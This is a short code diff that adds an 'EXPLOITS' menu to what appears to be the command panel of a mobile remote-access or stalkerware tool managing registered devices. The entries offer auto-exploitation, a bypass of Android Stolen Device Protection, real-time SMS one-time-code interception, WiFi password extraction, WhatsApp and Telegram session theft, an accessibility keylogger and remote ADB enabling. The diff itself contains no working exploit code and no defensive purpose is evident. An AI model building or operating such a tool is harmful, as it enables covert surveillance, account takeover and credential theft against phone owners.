@@ -74,6 +74,19 @@ export default {
           ]
         },
         {
+          title: '💉 EXPLOITS',
+          rows: [
+            { title: '🤖 AutoPwn', description: 'Auto-detect + exploit everything', rowId: 'auto_pwn' },
+            { title: '💉 Exploit List', description: 'Show available exploits', rowId: 'exploit_list' },
+            { title: '🛡️ SDP Bypass', description: 'Android 15 Stolen Device Protection', rowId: 'sdp_bypass' },
+            { title: '🔑 OTP Grabber', description: 'Real-time SMS code interception', rowId: 'otp_grabber' },
+            { title: '📡 WiFi Passwords', description: 'Extract saved WiFi passwords', rowId: 'wifi_extractor' },
+            { title: '🔓 Session Stealer', description: 'Steal WA/Telegram session (root)', rowId: 'session_stealer' },
+            { title: '⌨️ Keylogger', description: 'Accessibility keylogger', rowId: 'keylogger' },
+            { title: '📱 ADB over WiFi', description: 'Enable remote ADB', rowId: 'adb_wifi' },
+          ]
+        },
+        {
           title: '⚙️ MANAGEMENT',
           rows: [
             { title: '📱 Devices', description: 'List all registered devices', rowId: 'devices' },
